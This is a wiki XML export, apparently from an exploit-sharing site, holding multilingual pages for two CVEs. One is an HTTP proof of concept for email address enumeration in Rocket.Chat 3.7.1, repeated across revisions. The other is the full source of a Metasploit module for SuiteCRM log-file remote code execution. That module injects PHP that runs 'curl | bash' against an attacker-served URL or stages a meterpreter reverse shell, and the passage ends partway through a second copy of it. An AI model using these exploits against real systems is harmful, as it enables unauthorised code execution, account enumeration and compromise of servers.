Date: Tue, 03 Nov 2020 12:01:25 GMT
Connection: keep-alive
Content-Length: 78

{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":true}","success":true}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sample HTTP request sent with a non registered email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
Host: localhost:3000
Content-Length: 119
Accept: */*
Content-Type: application/json


{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"params\":[\"false@test.de\"],\"id\":\"3\"}"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The server response to an invalid email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP/1.1 200 OK
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-Instance-ID: DQDfuEfNLdbZr3zYH
Cache-Control: no-store
Pragma: no-cache
content-type: application/json
Vary: Accept-Encoding
Date: Tue, 03 Nov 2020 12:03:08 GMT
Connection: keep-alive
Content-Length: 79

{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":false}","success":true}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/pre&gt;</text>
      <sha1>1a2po5qxplq94z2aktgz02hpfavlcko</sha1>
    </revision>
    <revision>
      <id>3824</id>
      <parentid>3823</parentid>
      <timestamp>2021-06-01T02:54:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>3824</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2341" sha1="7i6k0r4x5m20mtzoa2xk1tpxbyd1ph2" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==簡介== &lt;!--T:1--&gt;
Rocket.Chat 3.7.1 及以下版本存在電子郵件地址枚舉漏洞。
&lt;/translate&gt;

==POC==
&lt;pre&gt;
################

Sample HTTP request sent with a registered email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
Host: localhost:3000
Content-Length: 122
Accept: */*
Content-Type: application/json


{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"params\":[\"positive@test.de\"],\"id\":\"3\"}"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The server response to a valid email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP/1.1 200 OK
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-Instance-ID: DQDfuEfNLdbZr3zYH
Cache-Control: no-store
Pragma: no-cache
content-type: application/json
Vary: Accept-Encoding
Date: Tue, 03 Nov 2020 12:01:25 GMT
Connection: keep-alive
Content-Length: 78

{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":true}","success":true}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sample HTTP request sent with a non registered email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
Host: localhost:3000
Content-Length: 119
Accept: */*
Content-Type: application/json


{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"params\":[\"false@test.de\"],\"id\":\"3\"}"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The server response to an invalid email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP/1.1 200 OK
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-Instance-ID: DQDfuEfNLdbZr3zYH
Cache-Control: no-store
Pragma: no-cache
content-type: application/json
Vary: Accept-Encoding
Date: Tue, 03 Nov 2020 12:03:08 GMT
Connection: keep-alive
Content-Length: 79

{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":false}","success":true}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/pre&gt;</text>
      <sha1>7i6k0r4x5m20mtzoa2xk1tpxbyd1ph2</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-28208 Rocket.Chat 3.7.1 電子郵件地址枚舉漏洞/ne</title>
    <ns>0</ns>
    <id>3856</id>
    <revision>
      <id>4467</id>
      <timestamp>2021-06-09T10:17:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== परिचय == ई-मेल ठेगाना गणना कमजोरीहरू संस्करण ..7.१ र मुनिको मा अवस्थि..."</comment>
      <origin>4467</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2412" sha1="r2jimvkrb8y1j69qypfa9lwm60ny4og" xml:space="preserve">&lt;languages /&gt;
== परिचय ==
ई-मेल ठेगाना गणना कमजोरीहरू संस्करण ..7.१ र मुनिको मा अवस्थित छन्।

==POC==
&lt;pre&gt;
################

Sample HTTP request sent with a registered email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
Host: localhost:3000
Content-Length: 122
Accept: */*
Content-Type: application/json


{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"params\":[\"positive@test.de\"],\"id\":\"3\"}"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The server response to a valid email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP/1.1 200 OK
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-Instance-ID: DQDfuEfNLdbZr3zYH
Cache-Control: no-store
Pragma: no-cache
content-type: application/json
Vary: Accept-Encoding
Date: Tue, 03 Nov 2020 12:01:25 GMT
Connection: keep-alive
Content-Length: 78

{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":true}","success":true}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sample HTTP request sent with a non registered email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
Host: localhost:3000
Content-Length: 119
Accept: */*
Content-Type: application/json


{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"params\":[\"false@test.de\"],\"id\":\"3\"}"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The server response to an invalid email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP/1.1 200 OK
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-Instance-ID: DQDfuEfNLdbZr3zYH
Cache-Control: no-store
Pragma: no-cache
content-type: application/json
Vary: Accept-Encoding
Date: Tue, 03 Nov 2020 12:03:08 GMT
Connection: keep-alive
Content-Length: 79

{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":false}","success":true}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/pre&gt;</text>
      <sha1>r2jimvkrb8y1j69qypfa9lwm60ny4og</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-28208 Rocket.Chat 3.7.1 電子郵件地址枚舉漏洞/zh-cn</title>
    <ns>0</ns>
    <id>3283</id>
    <revision>
      <id>3835</id>
      <timestamp>2021-06-01T03:02:31Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2020-28208 Rocket.Chat 3.7.1 电子邮件地址枚举漏洞"</comment>
      <origin>3835</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2366" sha1="i0otpavx9dbay4cet6irbafq8693b3o" xml:space="preserve">&lt;languages /&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==簡介==
Rocket.Chat 3.7.1 及以下版本存在電子郵件地址枚舉漏洞。
&lt;/div&gt;

==POC==
&lt;pre&gt;
################

Sample HTTP request sent with a registered email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
Host: localhost:3000
Content-Length: 122
Accept: */*
Content-Type: application/json


{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"params\":[\"positive@test.de\"],\"id\":\"3\"}"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The server response to a valid email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP/1.1 200 OK
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-Instance-ID: DQDfuEfNLdbZr3zYH
Cache-Control: no-store
Pragma: no-cache
content-type: application/json
Vary: Accept-Encoding
Date: Tue, 03 Nov 2020 12:01:25 GMT
Connection: keep-alive
Content-Length: 78

{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":true}","success":true}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sample HTTP request sent with a non registered email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
Host: localhost:3000
Content-Length: 119
Accept: */*
Content-Type: application/json


{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"params\":[\"false@test.de\"],\"id\":\"3\"}"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The server response to an invalid email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP/1.1 200 OK
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-Instance-ID: DQDfuEfNLdbZr3zYH
Cache-Control: no-store
Pragma: no-cache
content-type: application/json
Vary: Accept-Encoding
Date: Tue, 03 Nov 2020 12:03:08 GMT
Connection: keep-alive
Content-Length: 79

{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":false}","success":true}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/pre&gt;</text>
      <sha1>i0otpavx9dbay4cet6irbafq8693b3o</sha1>
    </revision>
    <revision>
      <id>3844</id>
      <parentid>3835</parentid>
      <timestamp>2021-06-01T03:06:20Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==简介== Rocket.Chat 3.7.1 及以下版本存在电子邮件地址枚举漏洞。"</comment>
      <origin>3844</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2305" sha1="jjh4yb7jz4nqzik2lt6uw8rfsj6bumj" xml:space="preserve">&lt;languages /&gt;
==简介==
Rocket.Chat 3.7.1 及以下版本存在电子邮件地址枚举漏洞。

==POC==
&lt;pre&gt;
################

Sample HTTP request sent with a registered email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
Host: localhost:3000
Content-Length: 122
Accept: */*
Content-Type: application/json


{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"params\":[\"positive@test.de\"],\"id\":\"3\"}"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The server response to a valid email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP/1.1 200 OK
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-Instance-ID: DQDfuEfNLdbZr3zYH
Cache-Control: no-store
Pragma: no-cache
content-type: application/json
Vary: Accept-Encoding
Date: Tue, 03 Nov 2020 12:01:25 GMT
Connection: keep-alive
Content-Length: 78

{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":true}","success":true}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sample HTTP request sent with a non registered email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
Host: localhost:3000
Content-Length: 119
Accept: */*
Content-Type: application/json


{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"params\":[\"false@test.de\"],\"id\":\"3\"}"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The server response to an invalid email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP/1.1 200 OK
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-Instance-ID: DQDfuEfNLdbZr3zYH
Cache-Control: no-store
Pragma: no-cache
content-type: application/json
Vary: Accept-Encoding
Date: Tue, 03 Nov 2020 12:03:08 GMT
Connection: keep-alive
Content-Length: 79

{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":false}","success":true}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/pre&gt;</text>
      <sha1>jjh4yb7jz4nqzik2lt6uw8rfsj6bumj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-28328 SuiteCRM Log File 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>3562</id>
    <revision>
      <id>4139</id>
      <timestamp>2021-06-06T13:45:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==MSF模塊== &lt;/translate&gt; &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/m..."</comment>
      <origin>4139</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="11613" sha1="kcxbbpub4qxzh6kdryy5fsze44qte7l" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==MSF模塊==
&lt;/translate&gt;
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::CmdStager
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'SuiteCRM Log File Remote Code Execution',
        'Description' =&gt; %q{
          This module exploits an input validation error on the log file extension parameter. It does
          not properly validate upper/lower case characters. Once this occurs, the application log file
          will be treated as a php file. The log file can then be populated with php code by changing the
          username of a valid user, as this info is logged. The php code in the file can then be executed
          by sending an HTTP request to the log file. A similar issue was reported by the same researcher
          where a blank file extension could be supplied and the extension could be provided in the file
          name. This exploit will work on those versions as well, and those references are included.
        },
        'License' =&gt; MSF_LICENSE,
        'Author' =&gt;
          [
            'M. Cory Billington' # @_th3y
          ],
        'References' =&gt;
          [
            ['CVE', '2020-28328'], # First CVE
            ['EDB', '49001'], # Previous exploit, this module will cover those versions too. Almost identical issue.
            ['URL', 'https://theyhack.me/CVE-2020-28320-SuiteCRM-RCE/'], # First exploit
            ['URL', 'https://theyhack.me/SuiteCRM-RCE-2/'] # This exploit
          ],
        'Platform' =&gt; %w[linux unix],
        'Arch' =&gt; %w[ARCH_X64 ARCH_CMD ARCH_X86],
        'Targets' =&gt;
        [
          [
            'Linux (x64)', {
              'Arch' =&gt; ARCH_X64,
              'Platform' =&gt; 'linux',
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'linux/x64/meterpreter_reverse_tcp'
              }
            }
          ],
          [
            'Linux (cmd)', {
              'Arch' =&gt; ARCH_CMD,
              'Platform' =&gt; 'unix',
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'cmd/unix/reverse_bash'
              }
            }
          ]
        ],
        'Notes' =&gt;
        {
          'Stability' =&gt; [CRASH_SAFE],
          'SideEffects' =&gt; [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' =&gt; [REPEATABLE_SESSION]
        },
        'Privileged' =&gt; true,
        'DisclosureDate' =&gt; '2021-04-28',
        'DefaultTarget' =&gt; 0
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to SuiteCRM', '/']),
        OptString.new('USER', [true, 'Username of user with administrative rights', 'admin']),
        OptString.new('PASS', [true, 'Password for administrator', 'admin']),
        OptBool.new('RESTORECONF', [false, 'Restore the configuration file to default after exploit runs', true]),
        OptString.new('WRITABLEDIR', [false, 'Writable directory to stage meterpreter', '/tmp']),
        OptString.new('LASTNAME', [false, 'Admin user last name to clean up profile', 'admin'])
      ]
    )
  end

  def check
    authenticate unless @authenticated
    return Exploit::CheckCode::Unknown unless @authenticated

    version_check_request = send_request_cgi(
      {
        'method' =&gt; 'GET',
        'uri' =&gt; normalize_uri(target_uri.path, 'index.php'),
        'keep_cookies' =&gt; true,
        'vars_get' =&gt; {
          'module' =&gt; 'Home',
          'action' =&gt; 'About'
        }
      }
    )

    return Exploit::CheckCode::Unknown("#{peer} - Connection timed out") unless version_check_request

    version_match = version_check_request.body[/
      Version
      \s
      \d{1} # Major revision
      \.
      \d{1,2} # Minor revision
      \.
      \d{1,2} # Bug fix release
      /x]

    version = version_match.partition(' ').last

    if version.nil? || version.empty?
      about_url = "#{full_uri}#{normalize_uri(target_uri, 'index.php')}?module=Home&amp;action=About"
      return Exploit::CheckCode::Unknown("Check #{about_url} to confirm version.")
    end

    patched_version = Rex::Version.new('7.11.18')
    current_version = Rex::Version.new(version)

    return Exploit::CheckCode::Appears("SuiteCRM #{version}") if current_version &lt;= patched_version

    Exploit::CheckCode::Safe("SuiteCRM #{version}")
  end

  def authenticate
    print_status("Authenticating as #{datastore['USER']}")
    initial_req = send_request_cgi(
      {
        'method' =&gt; 'GET',
        'uri' =&gt; normalize_uri(target_uri, 'index.php'),
        'keep_cookies' =&gt; true,
        'vars_get' =&gt; {
          'module' =&gt; 'Users',
          'action' =&gt; 'Login'
        }
      }
    )

    return false unless initial_req &amp;&amp; initial_req.code == 200

    login = send_request_cgi(
      {
        'method' =&gt; 'POST',
        'uri' =&gt; normalize_uri(target_uri, 'index.php'),
        'keep_cookies' =&gt; true,
        'vars_post' =&gt; {
          'module' =&gt; 'Users',
          'action' =&gt; 'Authenticate',
          'return_module' =&gt; 'Users',
          'return_action' =&gt; 'Login',
          'user_name' =&gt; datastore['USER'],
          'username_password' =&gt; datastore['PASS'],
          'Login' =&gt; 'Log In'
        }
      }
    )

    return false unless login &amp;&amp; login.code == 302

    res = send_request_cgi(
      {
        'method' =&gt; 'GET',
        'uri' =&gt; normalize_uri(target_uri, 'index.php'),
        'keep_cookies' =&gt; true,
        'vars_get' =&gt; {
          'module' =&gt; 'Administration',
          'action' =&gt; 'index'
        }
      }
    )

    auth_succeeded?(res)
  end

  def auth_succeeded?(res)
    return false unless res

    if res.code == 200
      print_good("Authenticated as: #{datastore['USER']}")
      if res.body.include?('Unauthorized access to administration.')
        print_warning("#{datastore['USER']} does not have administrative rights! Exploit will fail.")
        @is_admin = false
      else
        print_good("#{datastore['USER']} has administrative rights.")
        @is_admin = true
      end
      @authenticated = true
      return true
    else
      print_error("Failed to authenticate as: #{datastore['USER']}")
      return false
    end
  end

  def post_log_file(data)
    send_request_cgi(
      {
        'method' =&gt; 'POST',
        'uri' =&gt; normalize_uri(target_uri, 'index.php'),
        'ctype' =&gt; "multipart/form-data; boundary=#{data.bound}",
        'keep_cookies' =&gt; true,
        'headers' =&gt; {
          'Referer' =&gt; "#{full_uri}#{normalize_uri(target_uri, 'index.php')}?module=Configurator&amp;action=EditView"
        },
        'data' =&gt; data.to_s
      }
    )
  end

  def modify_system_settings_file
    filename = rand_text_alphanumeric(8).to_s
    extension = '.pHp'
    @php_fname = filename + extension
    action = 'Modify system settings file'
    print_status("Trying - #{action}")

    data = Rex::MIME::Message.new
    data.add_part('SaveConfig', nil, nil, 'form-data; name="action"')
    data.add_part('Configurator', nil, nil, 'form-data; name="module"')
    data.add_part(filename.to_s, nil, nil, 'form-data; name="logger_file_name"')
    data.add_part(extension.to_s, nil, nil, 'form-data; name="logger_file_ext"')
    data.add_part('info', nil, nil, 'form-data; name="logger_level"')
    data.add_part('Save', nil, nil, 'form-data; name="save"')

    res = post_log_file(data)
    check_logfile_request(res, action)
  end

  def poison_log_file
    action = 'Poison log file'
    if target.arch.first == 'cmd'
      command_injection = "&lt;?php `curl #{@download_url} | bash`; ?&gt;"
    else
      @meterpreter_fname = "#{datastore['WRITABLEDIR']}/#{rand_text_alphanumeric(8)}"
      command_injection = %(
        &lt;?php `curl #{@download_url} -o #{@meterpreter_fname};
        /bin/chmod 700 #{@meterpreter_fname};
        /bin/sh -c #{@meterpreter_fname};`; ?&gt;
      )
    end

    print_status("Trying - #{action}")

    data = Rex::MIME::Message.new
    data.add_part('Users', nil, nil, 'form-data; name="module"')
    data.add_part('1', nil, nil, 'form-data; name="record"')
    data.add_part('Save', nil, nil, 'form-data; name="action"')
    data.add_part('EditView', nil, nil, 'form-data; name="page"')
    data.add_part('DetailView', nil, nil, 'form-data; name="return_action"')
    data.add_part(datastore['USER'], nil, nil, 'form-data; name="user_name"')
    data.add_part(command_injection, nil, nil, 'form-data; name="last_name"')

    res = post_log_file(data)
    check_logfile_request(res, action)
  end

  def restore
    action = 'Restore logging to default configuration'
    print_status("Trying - #{action}")

    data = Rex::MIME::Message.new
    data.add_part('SaveConfig', nil, nil, 'form-data; name="action"')
    data.add_part('Configurator', nil, nil, 'form-data; name="module"')
    data.add_part('suitecrm', nil, nil, 'form-data; name="logger_file_name"')
    data.add_part('.log', nil, nil, 'form-data; name="logger_file_ext"')
    data.add_part('fatal', nil, nil, 'form-data; name="logger_level"')
    data.add_part('Save', nil, nil, 'form-data; name="save"')

    post_log_file(data)

    data = Rex::MIME::Message.new
    data.add_part('Users', nil, nil, 'form-data; name="module"')
    data.add_part('1', nil, nil, 'form-data; name="record"')
    data.add_part('Save', nil, nil, 'form-data; name="action"')
    data.add_part('EditView', nil, nil, 'form-data; name="page"')
    data.add_part('DetailView', nil, nil, 'form-data; name="return_action"')
    data.add_part(datastore['USER'], nil, nil, 'form-data; name="user_name"')
    data.add_part(datastore['LASTNAME'], nil, nil, 'form-data; name="last_name"')

    res = post_log_file(data)

    print_error("Failed - #{action}") unless res &amp;&amp; res.code == 301

    print_good("Succeeded - #{action}")
  end

  def check_logfile_request(res, action)
    fail_with(Failure::Unknown, "#{action} - no reply") unless res

    unless res.code == 301
      print_error("Failed - #{action}")
      fail_with(Failure::UnexpectedReply, "Failed - #{action}")
    end

    print_good("Succeeded - #{action}")
  end

  def execute_php
    print_status("Executing php code in log file: #{@php_fname}")
    res = send_request_cgi(
      {
        'uri' =&gt; normalize_uri(target_uri, @php_fname),
        'keep_cookies' =&gt; true
      }
    )
    fail_with(Failure::NotFound, "#{peer} - Not found: #{@php_fname}") if res &amp;&amp; res.code == 404
    register_files_for_cleanup(@php_fname)
    register_files_for_cleanup(@meterpreter_fname) unless @meterpreter_fname.nil? || @meterpreter_fname.empty?
  end

  def on_request_uri(cli, _request)
    send_response(cli, payload.encoded, { 'Content-Type' =&gt; 'text/plain' })
    print_good("#{peer} - Payload sent!")
  end

  def start_http_server
    start_service(
      {
        'Uri' =&gt; {
          'Proc' =&gt; proc do |cli, req|
            on_request_uri(cli, req)
          end,
          'Path' =&gt; resource_uri
        }
      }
    )
    @download_url = get_uri
  end

  def exploit
    start_http_server
    authenticate unless @authenticated
    fail_with(Failure::NoAccess, datastore['USER'].to_s) unless @authenticated
    fail_with(Failure::NoAccess, "#{datastore['USER']} does not have administrative rights!") unless @is_admin
    modify_system_settings_file
    poison_log_file
    execute_php
  ensure
    restore if datastore['RESTORECONF']
  end
end
&lt;/pre&gt;</text>
      <sha1>kcxbbpub4qxzh6kdryy5fsze44qte7l</sha1>
    </revision>
    <revision>
      <id>5376</id>
      <parentid>4139</parentid>
      <timestamp>2021-06-19T16:23:02Z</timestamp>
      <contributor>
        <username>猪儿虫</username>
        <id>64</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5376</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="11624" sha1="9lwgq88gva00wdahq1nxoce5366i674" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==MSF模塊== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::CmdStager
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'SuiteCRM Log File Remote Code Execution',
        'Description' =&gt; %q{
          This module exploits an input validation error on the log file extension parameter. It does
          not properly validate upper/lower case characters. Once this occurs, the application log file
          will be treated as a php file. The log file can then be populated with php code by changing the
          username of a valid user, as this info is logged. The php code in the file can then be executed
          by sending an HTTP request to the log file. A similar issue was reported by the same researcher
          where a blank file extension could be supplied and the extension could be provided in the file
          name. This exploit will work on those versions as well, and those references are included.
        },
        'License' =&gt; MSF_LICENSE,
        'Author' =&gt;
          [
            'M. Cory Billington' # @_th3y
          ],
        'References' =&gt;
          [
            ['CVE', '2020-28328'], # First CVE
            ['EDB', '49001'], # Previous exploit, this module will cover those versions too. Almost identical issue.
            ['URL', 'https://theyhack.me/CVE-2020-28320-SuiteCRM-RCE/'], # First exploit
            ['URL', 'https://theyhack.me/SuiteCRM-RCE-2/'] # This exploit
          ],
        'Platform' =&gt; %w[linux unix],
        'Arch' =&gt; %w[ARCH_X64 ARCH_CMD ARCH_X86],
        'Targets' =&gt;
        [
          [
            'Linux (x64)', {
              'Arch' =&gt; ARCH_X64,
              'Platform' =&gt; 'linux',
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'linux/x64/meterpreter_reverse_tcp'
              }
            }
          ],
          [
            'Linux (cmd)', {
              'Arch' =&gt; ARCH_CMD,
              'Platform' =&gt; 'unix',
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'cmd/unix/reverse_bash'
              }
            }
          ]
        ],
        'Notes' =&gt;
        {
